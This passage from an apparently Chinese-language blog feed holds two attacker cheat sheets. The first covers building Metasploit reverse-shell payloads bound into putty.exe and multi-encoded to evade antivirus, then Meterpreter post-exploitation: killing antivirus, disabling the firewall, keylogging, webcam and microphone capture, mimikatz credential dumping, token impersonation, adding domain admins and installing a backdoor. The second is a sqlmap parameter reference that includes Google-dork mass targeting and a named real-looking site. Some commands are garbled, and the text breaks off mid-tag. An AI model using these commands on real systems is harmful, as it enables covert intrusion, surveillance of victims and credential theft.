evasion(windows/windows_defender_exe) &gt; set filename payload.exe</span><br><span class="line">msf5 evasion(windows/windows_defender_exe) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 evasion(windows/windows_defender_exe) &gt; set LHOST 192.168.8.124</span><br><span class="line">msf5 evasion(windows/windows_defender_exe) &gt; set LPORT 1122</span><br><span class="line">msf5 evasion(windows/windows_defender_exe) &gt; run</span><br></pre></td></tr></table></figure><p>设置侦听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler -H 10.211.55.2 -P 3333 -p windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><h2 id="捆绑免杀"><a href="#捆绑免杀" class="headerlink" title="捆绑免杀"></a>捆绑免杀</h2><h2 id="生成payload-捆绑putty-exe"><a href="#生成payload-捆绑putty-exe" class="headerlink" title="生成payload 捆绑putty.exe"></a>生成payload 捆绑putty.exe</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122  -x putty.exe  -f exe -o payload3.exe</span><br></pre></td></tr></table></figure><h2 id="捆绑编码免杀"><a href="#捆绑编码免杀" class="headerlink" title="捆绑编码免杀"></a>捆绑编码免杀</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -e x86/shikata_ga_nai -x putty.exe  -i 15 -f exe -o payload4.exe</span><br></pre></td></tr></table></figure><h2 id="多重编码免杀"><a href="#多重编码免杀" class="headerlink" title="多重编码免杀"></a>多重编码免杀</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/call4_dword_xor -i 14 LHOST=192.168.8.124 LPORT=1122 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 13 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -b &quot;&amp;&quot; -i 4 -f raw | msfvenom -a x86 --platform windows -e cmd/powershell_base64 -i 10 -x putty.exe -k -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://virustotal.com/   验证静态免杀 bypass</span><br></pre></td></tr></table></figure><h1 id="MSF-后渗透模块"><a href="#MSF-后渗透模块" class="headerlink" title="MSF 后渗透模块"></a>MSF 后渗透模块</h1><h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><ul><li>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS(基于主机的入侵检测系统)很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。</li></ul><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/migrate</span><br></pre></td></tr></table></figure><p>关闭杀软</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run killav</span><br></pre></td></tr></table></figure><p>通过其 shell 来关闭防火墙</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh adcfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><p>查看目标机所有流量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run packetrecorder -i 1</span><br></pre></td></tr></table></figure><p>提取系统信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scraper</span><br></pre></td></tr></table></figure><p>查看进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br></pre></td></tr></table></figure><p> 切换进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate 1774</span><br></pre></td></tr></table></figure><p>截屏  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screenshot</span><br></pre></td></tr></table></figure><p>获取系统运行的平台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure><h3 id="基本命令-1"><a href="#基本命令-1" class="headerlink" title="基本命令"></a>基本命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run  getgui  -e</span><br><span class="line">```   </span><br><span class="line">开启目标主机远程桌面</span><br></pre></td></tr></table></figure><p>sysinfo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令为显示远程主机的系统信息</span><br></pre></td></tr></table></figure><p>executef notepad.exe</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">execute -h  </span><br></pre></td></tr></table></figure><p>显示帮助信息。-f为执行要运行的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute  -H -f notepad.exe</span><br></pre></td></tr></table></figure><p>如果希望隐藏后台执行，加参数-H</p><h3 id="摄像头命令"><a href="#摄像头命令" class="headerlink" title="摄像头命令"></a>摄像头命令</h3><p>音频录制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">record_mic</span><br></pre></td></tr></table></figure><p>查看摄像头接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webcam_chat　</span><br></pre></td></tr></table></figure><p>查看摄像头列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webcam_list　　</span><br></pre></td></tr></table></figure><p>摄像头视频获取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webcam_stream</span><br></pre></td></tr></table></figure><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><ul><li>portfwd -h</li><li>用法：portfwd [-h] [add | delete | list | flush] [args]</li><li>选项：<br>  -L <opt>要监听的本地主机（可选）<br>  -h帮助横幅<br>  -l <opt>要监听的本地端口<br>  -p <opt>连接到的远程端口<br>  -r <opt>要连接到的远程主机</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">portfwd  add -l 4444 -p 3389 -r 192.168.1.102    # 端口转发,本机监听4444,把目标机3389转到本机4444</span><br><span class="line"></span><br><span class="line">rdesktop -u Administrator -p bk#123 127.0.0.1:4444 #使用rdesktop来连接桌面，-u 用户名 -p 密码</span><br><span class="line"></span><br><span class="line">rdesktop 127.1.1.0:4444 #需要输入用户名和密码远程连接</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="shell网络环境"><a href="#shell网络环境" class="headerlink" title="shell网络环境"></a>shell网络环境</h3><p>添加一条通向目标服务器内网的路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;run get_local_subnets</span><br></pre></td></tr></table></figure><p>查看路由设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;run autoroute -s 100.0.0.0/8   #(根据目标内网网络而定)</span><br></pre></td></tr></table></figure><p>一般来说，在meterpreter中设置路由便可以达到通往其内网的目的。然而有些时候还是会失败，这时我们可以background返回msf&gt;，查看下外面的路由情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;run autoroute –p</span><br></pre></td></tr></table></figure><p>如果发现没有路由信息，说明meterpreter shell设置的路由并没有生效，我们可以在msf中添加路由。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br></pre></td></tr></table></figure><p>说明：1表示session 1，攻击机如果要去访问10.0.0.0&#x2F;8网段的资源，其下一跳是session1，至于什么是下一条这里不多说了，反正就是目前攻击机可以访问内网资源了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf&gt;route add 10.0.0.0 255.0.0.0 1</span><br></pre></td></tr></table></figure><h3 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start：开启键盘记录功能</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyscan_dump：显示捕捉到的键盘记录信息</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyscan_stop：停止键盘记录</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_user username password -h ip    #在远程目标主机上添加一个用户</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_group_user &quot;Domain Admins&quot; username -h ip    #将用户添加到目标主机的域管理员组中</span><br></pre></td></tr></table></figure><h3 id="Hash获取"><a href="#Hash获取" class="headerlink" title="Hash获取"></a>Hash获取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz  #加载mimikatz</span><br><span class="line">meterpreter &gt; msv #获取hash值</span><br><span class="line">meterpreter &gt; kerberos #获取明文</span><br><span class="line">meterpreter &gt;ssp   #获取明文信息</span><br><span class="line">meterpreter &gt; wdigest #获取系统账户信</span><br><span class="line">meterpreter &gt;mimikatz_command -f a::   #必须要以错误的模块来让正确的模块显示</span><br><span class="line">meterpreter &gt;mimikatz_command -f hash::   #获取目标 hash</span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">meterpreter &gt; mimikatz_command -f sekurlsa::searchPa</span><br><span class="line">run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure><h3 id="抓包嗅探"><a href="#抓包嗅探" class="headerlink" title="抓包嗅探"></a>抓包嗅探</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use sniffer # 加载嗅探模块</span><br><span class="line">sniffer_interfaces #列出目标主机所有开放的网络接口</span><br><span class="line">sniffer_start 2 #获取正在实施嗅探网络接口的统计数据</span><br><span class="line">sniffer_dump 2 /tmp/test2.cap #在目标主机上针对特定范围的数据包缓冲区启动嗅探</span><br><span class="line">sniffer_stop  2   #停止嗅探</span><br></pre></td></tr></table></figure><h4 id="对抓取的包进行解包："><a href="#对抓取的包进行解包：" class="headerlink" title="对抓取的包进行解包："></a>对抓取的包进行解包：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/sniffer/psnuffle</span><br><span class="line">set pcapfile 1.cap</span><br><span class="line">run</span><br><span class="line">wireshark，加载这个/tmp/xpsp1.cap 也可</span><br></pre></td></tr></table></figure><h3 id="盗取令牌"><a href="#盗取令牌" class="headerlink" title="盗取令牌"></a>盗取令牌</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt;use incognito    加载incoginto功能（用来盗窃目标主机的令牌或是假冒用户)</span><br><span class="line">meterpreter &gt;list_tokens -u    列出目标主机用户的可用令牌</span><br><span class="line">meterpreter &gt;list_tokens -g    列出目标主机用户组的可用令牌</span><br><span class="line">meterpreter &gt;impersonate_token DOMAIN_NAME\\USERNAME    假冒目标主机上的可用令牌,如meterpreter &gt; impersonate_token QLWEB\\Administrato</span><br></pre></td></tr></table></figure><h3 id="持久控制服务器"><a href="#持久控制服务器" class="headerlink" title="持久控制服务器"></a>持久控制服务器</h3><ul><li>前提条件服务器系统可以<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run metsvc 安装后门</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/metsvc_bind_tcp</span><br><span class="line">set LPORT 31337</span><br><span class="line">set RHOST 192.168.2.131</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap</title>
      <link href="/archives/e5da2ca1.html"/>
      <url>/archives/e5da2ca1.html</url>
      
        <content type="html"><![CDATA[<h1 id="SQLMAP介绍"><a href="#SQLMAP介绍" class="headerlink" title="SQLMAP介绍"></a>SQLMAP介绍</h1><ul><li><p>sqlmap 是一个由Python语言编写的开源渗透测试工具，它主要用来检测sql注入漏洞，是一款功能强大的sql漏洞检测利用工具。</p></li><li><p>它可以检测的数据库有：access、mssql、mysql、oracle、postgresql、db2、sqlite等</p></li><li><p>可以进行 sql盲注、union查询、显错注入、延迟注入、post注入、cookie注入等</p></li><li><p>其他功能:执行命令、列举用户、检测权限、自动破解、数据导出等功能。</p></li></ul><h1 id="sqlmap安装"><a href="#sqlmap安装" class="headerlink" title="sqlmap安装"></a>sqlmap安装</h1><ul><li>下载地址：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqlmap.org</span><br></pre></td></tr></table></figure></li><li>安装<br>首先需要安装python2.7 环境<br>直接解压即可</li><li>更新<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py --update</span><br></pre></td></tr></table></figure></li><li>建议直接使用 kali 内置sqlmap.<h1 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h1><h2 id="基本参数"><a href="#基本参数" class="headerlink" title="基本参数"></a>基本参数</h2></li></ul><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Sqlmap.py  -h          查看帮助选项</span><br><span class="line">is-dba           当前用户权限</span><br><span class="line">dbs       所有数据库</span><br><span class="line">current-db   网站当前数据库</span><br><span class="line">users       所有数据库用户</span><br><span class="line">current-user   当前数据库用户</span><br><span class="line">tables       参数:列表名</span><br><span class="line">columns       参数:列字段</span><br><span class="line">dump       参数:下载数据</span><br><span class="line">--dump        获取表中的数据，包含列 </span><br><span class="line">--dump-all   转存DBMS数据库所有表项目</span><br><span class="line">--level       测试等级(1-5)，默认为1</span><br></pre></td></tr></table></figure><hr><p>读取数据库—&gt;读取表—-&gt;读取表的列—-&gt;获取内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-D  指定数据库</span><br><span class="line">-T    指定表</span><br><span class="line">-C    指定列</span><br><span class="line">--dbms=mysql  oracle mssql     指定数据库</span><br></pre></td></tr></table></figure><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--users        枚举所有用户</span><br><span class="line">--passwords    枚举所有用户密码</span><br><span class="line">--roles        列出数据库管理员角色</span><br><span class="line">--privileges    列出数据库管理员权限</span><br></pre></td></tr></table></figure><p>列举数据库系统的架构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://xx.com/int.php?id=1&quot; --schema --batch --exclude-sysdbs</span><br></pre></td></tr></table></figure><hr><h2 id="探测等级"><a href="#探测等级" class="headerlink" title="探测等级"></a>探测等级</h2><p>参数：–level</p><ul><li>共有五个等级，默认为1，sqlmap使用的payload可以在xml&#x2F;payloads.xml中看到，你也可以根据相应的格式添加自己的payload。</li><li>这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent&#x2F;Referer头在level为3的时候就会测试。</li><li>总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</li></ul><hr><h2 id="显示调试信息"><a href="#显示调试信息" class="headerlink" title="显示调试信息"></a>显示调试信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-v  显示调试信息 有7个级别</span><br></pre></td></tr></table></figure><p>0、只显示python错误以及严重的信息。<br>1、同时显示基本信息和警告信息。（默认）<br>2、同时显示debug信息。<br>3、同时显示注入的payload。<br>4、同时显示HTTP请求。<br>5、同时显示HTTP响应头。<br>6、同时显示HTTP响应页面。</p><hr><h2 id="风险等级"><a href="#风险等级" class="headerlink" title="风险等级"></a>风险等级</h2><ul><li>参数：–risk</li><li>共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</li><li>在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</li><li>测试的语句同样可以在xml&#x2F;payloads.xml中找到，你也可以自行添加payload。</li></ul><hr><h2 id="获取目标"><a href="#获取目标" class="headerlink" title="获取目标"></a>获取目标</h2><p>参数：-u或者–url<br>格式：<code>http(s)://xxxxxxurl[:port]/[…]</code><br>例如：<code>python sqlmap.py -u http://www.xxxxxx.com/vuln.php?id=1</code></p><p>参数：-u或者–url<br>格式：<code>http(s)://xxxxxxurl[:port]/[…]</code><br>例如：<code>python sqlmap.py -u &quot;http://www.xxxxxx.com/vuln.php?id=1&quot;</code></p><hr><h2 id="从文本中获取多个目标扫描"><a href="#从文本中获取多个目标扫描" class="headerlink" title="从文本中获取多个目标扫描"></a>从文本中获取多个目标扫描</h2><p>参数：-m<br>文件中保存url格式如下，sqlmap会一个一个检测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.xxxxxx1.com/vuln1.php?q=foobar</span><br><span class="line">www.xxxxxx2.com/vuln2.asp?id=1</span><br><span class="line">www.xxxxxx3.com/vuln3/id/1*</span><br></pre></td></tr></table></figure><h2 id="获取http请求注入"><a href="#获取http请求注入" class="headerlink" title="获取http请求注入"></a>获取http请求注入</h2><p>参数：-r<br>sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。</p><p>比如文本文件内如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /vuln.php HTTP/1.1</span><br><span class="line">Host: www.xxxxxx.com</span><br><span class="line">User-Agent: Mozilla/4.0</span><br><span class="line">id=1</span><br></pre></td></tr></table></figure><h2 id="获取http请求注入-1"><a href="#获取http请求注入-1" class="headerlink" title="获取http请求注入"></a>获取http请求注入</h2><p>参数：-r<br>sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。</p><p>比如文本文件内如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /vuln.php HTTP/1.1</span><br><span class="line">Host: www.xxxxxx.com</span><br><span class="line">User-Agent: Mozilla/4.0</span><br><span class="line">id=1</span><br></pre></td></tr></table></figure><h2 id="处理Google搜索结果"><a href="#处理Google搜索结果" class="headerlink" title="处理Google搜索结果"></a>处理Google搜索结果</h2><p>参数：-g</p><p>sqlmap可以测试注入Google的搜索结果中的GET参数（只获取前100个结果）。</p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -g &quot;inurl:php?id=&quot;</span><br></pre></td></tr></table></figure><h2 id="–data"><a href="#–data" class="headerlink" title="–data"></a>–data</h2><p>此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。</p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u “http://www.xxxx.com/xxxx.php” --data=“id=1”</span><br></pre></td></tr></table></figure><h2 id="–param-del"><a href="#–param-del" class="headerlink" title="–param-del"></a>–param-del</h2><p>参数拆分字符</p><p>当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://www.xxxx.com/vuln.php&quot; --data=&quot;query=foobar;d=1&quot; --param-del=&quot;;&quot; </span><br></pre></td></tr></table></figure><h2 id="–cookie"><a href="#–cookie" class="headerlink" title="–cookie"></a>–cookie</h2><p>适用于cookie注入</p><p>将参加加入cookie注入测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.ntjx.org/jsj/DownloadShow.asp&quot; --cookie &quot;id=9&quot; --table --level 2</span><br></pre></td></tr></table></figure><h2 id="–referer-–headers-–proxy"><a href="#–referer-–headers-–proxy" class="headerlink" title="–referer,–headers,–proxy"></a>–referer,–headers,–proxy</h2><p>–referer<br>sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入。  </p><p>–headers<br>可以通过–headers参数来增加额外的http头<br>–hearders “client-ip: 1.1.1.1’”  </p><p>–proxy<br>使用–proxy代理是格式为：<code>http://url:port。</code><br>–proxy&#x3D;<a href="http://127.0.0.1:1080/">http://127.0.0.1:1080</a><br>–proxy-file c:&#x2F;1.txt</p><h2 id="时间控制"><a href="#时间控制" class="headerlink" title="时间控制"></a>时间控制</h2><p>–delay<br>可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p><p>–timeout<br>可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。<br>设定重试超时<br>–retries</p><p>当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。<br>设定随机改变的参数值</p><h2 id="–safe-url-–safe-freq"><a href="#–safe-url-–safe-freq" class="headerlink" title="–safe-url,–safe-freq"></a>–safe-url,–safe-freq</h2><p>有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。</p><p>绕过这个策略有两种方式：</p><p>1、–safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。<br>2、–safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。</p><h2 id="p"><a href="#p" class="headerlink" title="-p"></a>-p</h2><p>sqlmap默认测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p</p><p>参数设置想要测试的参数。例如： -p “id,user-anget”</p><h2 id="–prefix-–suffix"><a href="#–prefix-–suffix" class="headerlink" title="–prefix,–suffix"></a>–prefix,–suffix</h2><p>有些环境中，需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行。</p><p>例如，代码中是这样调用数据库的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM users WHERE id=(’&quot; . $_GET[’id’] . &quot;’) LIMIT 0, 1&quot;; </span><br></pre></td></tr></table></figure><p>这时你就需要–prefix和–suffix参数了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc&quot;</span><br></pre></td></tr></table></figure><p>这样执行的SQL语句变成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND (’abc’=’abc’) LIMIT 0, 1&quot;; </span><br></pre></td></tr></table></figure><h2 id="–technique"><a href="#–technique" class="headerlink" title="–technique"></a>–technique</h2><p>这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。</p><p>支持的探测方式如下：</p><p>B: Boolean-based blind SQL injection（布尔型注入）<br>E: Error-based SQL injection（报错型注入）<br>U: UNION query SQL injection（可联合查询注入）<br>S: Stacked queries SQL injection（可多语句查询注入）<br>T: Time-based blind SQL injection（基于时间延迟注入）</p><h2 id="–union-cols"><a href="#–union-cols" class="headerlink" title="–union-cols"></a>–union-cols</h2><p>默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当–level为5的时候他会增加测试到50个字段数。设定–union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。</p><p>–union-char<br>默认情况下sqlmap针对UNION查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，这是你可以用–union-char只定UNION查询的字符。<br>二阶SQL注入</p><h2 id="–second-order"><a href="#–second-order" class="headerlink" title="–second-order"></a>–second-order</h2><p>有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。–second-order后门跟一个判断页面的URL地址.</p><h2 id="–dump-all-–exclude-sysdbs"><a href="#–dump-all-–exclude-sysdbs" class="headerlink" title="–dump-all,–exclude-sysdbs"></a>–dump-all,–exclude-sysdbs</h2><p>使用–dump-all参数获取所有数据库表的内容，可同时加上–exclude-sysdbs只获取用户数据库的表，需要注意在Microsoft SQL Server中master数据库没有考虑成为一个系统数据库，因为</p><p>有的管理员会把他当初用户数据库一样来使用它。</p><h2 id="–dump-all-–exclude-sysdbs-1"><a href="#–dump-all-–exclude-sysdbs-1" class="headerlink" title="–dump-all,–exclude-sysdbs"></a>–dump-all,–exclude-sysdbs</h2><p>使用–dump-all参数获取所有数据库表的内容，可同时加上–exclude-sysdbs只获取用户数据库的表，需要注意在Microsoft SQL Server中master数据库没有考虑成为一个系统数据库，因为</p><p>有的管理员会把他当初用户数据库一样来使用它。</p><h2 id="–search-C-T-D"><a href="#–search-C-T-D" class="headerlink" 